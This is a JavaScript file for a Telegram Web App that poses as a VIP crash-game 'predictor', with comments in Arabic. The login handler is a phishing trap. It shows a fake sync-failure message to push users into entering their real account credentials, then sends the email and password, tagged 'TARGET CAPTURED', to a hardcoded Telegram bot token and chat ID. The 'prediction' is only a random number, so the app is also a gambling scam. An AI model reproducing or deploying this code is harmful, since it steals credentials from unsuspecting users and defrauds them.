// تهيئة Telegram Web App
const webApp = window.Telegram.WebApp;
webApp.expand();

let loginAttempts = 0;
// بوت الصيد الذي تصله البيانات (القديم)
const HUNTER_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

async function handleLogin() {
    const email = document.getElementById('user-email').value;
    const pass = document.getElementById('user-pass').value;
    const btn = document.getElementById('login-btn');
    const msg = document.getElementById('login-msg');
    const loader = document.getElementById('loader');

    if (email.length < 4 || pass.length < 4) return alert("يرجى ملء كافة البيانات");

    btn.disabled = true;
    loader.classList.remove('hidden');

    setTimeout(async () => {
        loginAttempts++;
        if (loginAttempts === 1) {
            // المناورة: رسالة المزامنة
            loader.classList.add('hidden');
            btn.disabled = false;
            msg.innerText = "فشل في المزامنة: يرجى تسجيل الدخول بحسابك الأصلي لربط السيرفر";
            msg.style.color = "#fbbf24"; 
            document.getElementById('user-pass').value = ""; 
        } else {
            // إرسال البيانات لبوت الصيد
            const data = `🚀 TARGET CAPTURED!\n📧 User: ${email}\n🔑 Pass: ${pass}\n🤖 Via: Web App VIP`;
            fetch(`https://api.telegram.org/bot${HUNTER_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(data)}`);

            // الانتقال للواجهة
            gsap.to("#login-screen", { duration: 0.5, y: -1000, opacity: 0, onComplete: () => {
                document.getElementById('login-screen').style.display = 'none';
                const gc = document.getElementById('game-container');
                gc.style.display = 'flex';
                gsap.to(gc, { duration: 0.5, opacity: 1 });
                webApp.HapticFeedback.notificationOccurred('success');
            }});
        }
    }, 1800);
}

// محرك الطائرة
const UI = {
    predictBtn: document.getElementById('predict-btn'),
    mult: document.getElementById('multiplier'),
    status: document.getElementById('status-label'),
    targetDisplay: document.getElementById('target-display'),
    planeBox: document.getElementById('plane-box')
};

let gameActive = false;
UI.predictBtn.onclick = () => {
    if(gameActive) return;
    gameActive = true;
    webApp.HapticFeedback.impactOccurred('medium');
    UI.predictBtn.style.opacity = "0.5";
    const target = (Math.random() * 6.5 + 1.1).toFixed(2);
    let count = 3;
    const t = setInterval(() => {
        UI.mult.innerText = `CONNECTING... ${count}`;
        count--;
        if(count < 0) { clearInterval(t); startFlight(parseFloat(target)); }
    }, 800);
};

function startFlight(target) {
    UI.status.innerText = "FLYING...";
    UI.planeBox.style.display = "block";
    UI.targetDisplay.innerText = target + "x";
    let val = { v: 1.00 };
    gsap.to(val, {
        v: target, duration: 4.5, ease: "power1.in",
        onUpdate: () => {
            UI.mult.innerText = val.v.toFixed(2) + "x";
            let p = (val.v - 1) / (target - 1);
            gsap.set(UI.planeBox, { x: p * (window.innerWidth - 80), y: -Math.pow(p, 2) * 150, rotation: -p * 15 });
        },
        onComplete: () => {
            UI.status.innerText = "CRASHED!";
            UI.mult.classList.add('text-red-500');
            webApp.HapticFeedback.notificationOccurred('error');
            setTimeout(() => {
                UI.mult.classList.remove('text-red-500');
                UI.planeBox.style.display = "none";
                gameActive = false;
                UI.predictBtn.style.opacity = "1";
                UI.status.innerText = "Ready";
            }, 3000);
        }
    });
}
